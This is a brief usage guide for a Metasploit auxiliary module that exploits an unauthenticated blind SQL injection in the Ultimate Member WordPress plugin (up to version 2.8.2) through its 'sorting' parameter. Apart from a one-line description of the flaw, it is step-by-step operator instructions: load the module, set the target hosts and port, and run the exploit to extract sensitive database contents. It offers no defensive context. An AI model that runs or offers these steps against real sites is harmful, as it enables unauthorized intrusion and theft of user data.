**The description of current metasploit exploit**
The Ultimate Member plugin for WordPress up to version 2.8.2 is vulnerable to SQL injection via          the 'sorting' parameter. This allows unauthenticated attackers to exploit blind SQL injections and          extract sensitive information from the database.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_ultimate_member_sorting_sqli
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.